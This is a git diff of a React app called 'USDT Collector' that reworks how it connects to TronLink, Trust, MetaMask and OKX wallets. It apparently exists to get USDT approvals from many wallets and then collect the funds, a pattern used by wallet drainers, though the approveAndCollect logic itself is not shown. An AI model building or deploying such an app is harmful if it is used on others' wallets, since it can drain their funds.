@@ -1,15 +1,16 @@
 import { useState, useEffect } from 'react'
-import { createAppKit } from '@reown/appkit/react'
-import { TronAdapter } from '@reown/appkit-adapter-tron'
-import { tronMainnet, tronShastaTestnet } from '@reown/appkit/networks'
-import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
-import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
-import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'  // ← ADD: needed for MetaMask Tron
-import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'    // ← ADD: OKX has millions of Tron users
-import { useAppKit } from '@reown/appkit/react'
-import { useAppKitAccount } from '@reown/appkit/react'     // ← FIX Bug 2: reactive wallet state
-import { useAppKitProvider } from '@reown/appkit/react'    // ← FIX Bug 2: get tronWeb from AppKit
+// import { createAppKit } from '@reown/appkit/react'
+// import { TronAdapter } from '@reown/appkit-adapter-tron'
+// import { tronMainnet, tronShastaTestnet } from '@reown/appkit/networks'
+// import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
+// import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
+// import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'  // ← ADD: needed for MetaMask Tron
+// import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'    // ← ADD: OKX has millions of Tron users
+// import { useAppKit } from '@reown/appkit/react'
+// import { useAppKitAccount } from '@reown/appkit/react'     // ← FIX Bug 2: reactive wallet state
+// import { useAppKitProvider } from '@reown/appkit/react'    // ← FIX Bug 2: get tronWeb from AppKit
 import { Wallet, Copy, CheckCircle, AlertCircle } from 'lucide-react'
+import { useWallet } from './WalletSetup'
 
 // ── CONFIG ──
 const WC_PROJECT_ID = "7fb3ba95be65cff7bc75b742e816b1cb"
@@ -25,39 +26,39 @@ const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NET
 
 // ── Tron Adapter ──
 // FIX Bug 3: Added MetaMaskAdapter and OkxWalletAdapter — official Tron docs include all four
-const tronAdapter = new TronAdapter({
-  walletAdapters: [
-    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
-    new MetaMaskAdapter(),    // ← ADD (install: @tronweb3/tronwallet-adapter-metamask-tron)
-    new TrustAdapter(),
-    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),  // ← ADD (install: @tronweb3/tronwallet-adapter-okxwallet)
-  ]
-})
+// const tronAdapter = new TronAdapter({
+//   walletAdapters: [
+//     new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
+//     new MetaMaskAdapter(),    // ← ADD (install: @tronweb3/tronwallet-adapter-metamask-tron)
+//     new TrustAdapter(),
+//     new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),  // ← ADD (install: @tronweb3/tronwallet-adapter-okxwallet)
+//   ]
+// })
 
 // ── Create AppKit (must stay outside component) ──
-createAppKit({
-  adapters: [tronAdapter],
-  networks: [NETWORK === "Mainnet" ? tronMainnet : tronShastaTestnet],
-  projectId: WC_PROJECT_ID,
-  metadata: {
-    name: 'USDT Collector',
-    description: 'Collect USDT from multiple wallets to one main wallet',
-    url: window.location.origin,
-    icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png']
-  },
-  themeMode: 'dark',
-  themeVariables: {
-    '--w3m-accent': '#00ff9f',
-  },
+// createAppKit({
+//   adapters: [tronAdapter],
+//   networks: [NETWORK === "Mainnet" ? tronMainnet : tronShastaTestnet],
+//   projectId: WC_PROJECT_ID,
+//   metadata: {
+//     name: 'USDT Collector',
+//     description: 'Collect USDT from multiple wallets to one main wallet',
+//     url: window.location.origin,
+//     icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png']
+//   },
+//   themeMode: 'dark',
+//   themeVariables: {
+//     '--w3m-accent': '#00ff9f',
+//   },
 
-  allWallets: 'SHOW',
-  features: {
-    email: false,    // Disable email login — you only want wallet connections
-    socials: [],     // Disable social login
-    analytics: true,
-  },
-  // ─────────────────────────────────────────────────────────────────
-})
+//   allWallets: 'SHOW',
+//   features: {
+//     email: false,    // Disable email login — you only want wallet connections
+//     socials: [],     // Disable social login
+//     analytics: true,
+//   },
+//   // ─────────────────────────────────────────────────────────────────
+// })
 
 // === ABIs ===
 const USDT_ABI = [
@@ -94,19 +95,30 @@ export default function App() {
   const [loading, setLoading]         = useState(false)
   const [txHash, setTxHash]           = useState('')
 
-  const { open }                = useAppKit()
 
-  // FIX Bug 2: Use AppKit hooks instead of manually watching window.tronLink.
-  // `address` and `isConnected` update reactively whenever the user connects
-  // or disconnects through the modal — the old useEffect never fired for this.
-  const { address: walletAddress, isConnected } = useAppKitAccount()
+  const {
+  wallets,
+  wallet,
+  address: walletAddress,
+  connected: isConnected,
+  connecting,
+  connect,
+  disconnect,
+} = useWallet() as any
 
-  // FIX Bug 2: Get the tronWeb instance from AppKit's Tron provider.
-  // `walletProvider` here is the tronWeb object injected by whatever wallet connected.
+const tronWeb =
+  (window as any)?.tronWeb ||
+  (window as any)?.tronLink?.tronWeb ||
+  (window as any)?.trustwallet?.tronLink?.tronWeb ||
+  (wallet?.adapter as any)?.tronWeb ||
+  null
 
-  // const { walletProvider: tronWeb } = useAppKitProvider('tron')
-const { walletProvider } = useAppKitProvider('tron')
-const tronWeb = walletProvider as any
+  // const { open }                = useAppKit()
+
+  // const { address: walletAddress, isConnected } = useAppKitAccount()
+
+// const { walletProvider } = useAppKitProvider('tron')
+// const tronWeb = walletProvider as any
 
   // Auto-fetch balance whenever wallet connects or address changes
   useEffect(() => {
@@ -134,9 +146,13 @@ const tronWeb = walletProvider as any
 
   // FIX Bug 4: Don't toggle loading around open() — the modal is async
   // and open() returns immediately. Loading is meaningless here.
-const handleConnect = () => {
-  console.log("Opening wallet modal...")
-  open()
+const handleConnect = async () => {
+  try {
+    setStatus('Opening wallet list...')
+    await connect()
+  } catch (err: any) {
+    setStatus('❌ ' + (err.message || 'Failed to open wallet list'))
+  }
 }
 
   const approveAndCollect = async () => {
@@ -189,14 +205,14 @@ const handleConnect = () => {
 
               <button
                 onClick={handleConnect}
-                disabled={loading}
+                disabled={loading || connecting}
                 className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
               >
                 Connect Wallet
                 <Wallet className="w-6 h-6" />
               </button>
 
-              <p className="text-xs text-zinc-500 mt-6">Trust Wallet • TronLink • MetaMask • OKX • 100+ more</p>
+              <p className="text-xs text-zinc-500 mt-6">TronLink • Trust Wallet • MetaMask • OKX • WalletConnect catalog</p>
             </div>
           ) : (
             <div className="space-y-6">
